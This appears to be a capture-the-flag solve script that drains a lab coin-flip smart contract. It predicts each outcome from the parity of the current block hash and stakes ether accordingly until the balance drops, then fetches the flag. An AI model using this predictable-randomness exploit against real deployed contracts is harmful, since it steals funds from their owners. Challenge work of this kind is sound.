
from web3 import Web3
import time
from blockchain import compile_contract, construct_contract, ETHER
from platypwn_helper import spawn_instance, get_flag, kill_instance

spawner = ("10.80.1.181", 31337)
spawner = "10.80.3.200", 31337


d= spawn_instance(spawner)

rpc = d["RPC"]

privateKey = d["PrivateKey"]
address = d["Address"]
setupAddress = d["setupAddress"]

w3 = Web3(Web3.HTTPProvider(rpc))
acct = w3.eth.account.from_key(privateKey)
w3.eth.default_account = acct.address



setup_abi, setup_bytecode = compile_contract('Setup.sol')
chal_abi, chal_bytecode = compile_contract('Chal.sol')

setup_instance = w3.eth.contract(address=setupAddress, abi=setup_abi, bytecode=setup_bytecode)
targetAddress = setup_instance.functions.TARGET().call()

chal_instance = w3.eth.contract(address=targetAddress, abi=chal_abi, bytecode=chal_bytecode)


while True:
    balance = chal_instance.functions.getBalance().call()
    print(f'Balance: {(balance // (10**15)) / 1000:.2f}')
    if balance < 10 * ETHER:
        break
    bnum = w3.eth.block_number
    block = w3.eth.get_block(bnum)
    bhash = int.from_bytes(block.hash, byteorder="big")
    if bhash % 2 == 0:
        val = 5 * ETHER
    else:
        val = ETHER // 20
    tx_hash = chal_instance.functions.flip().transact({
        "value": val
        }
    )
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)


print(get_flag(spawner))

kill_instance(spawner)

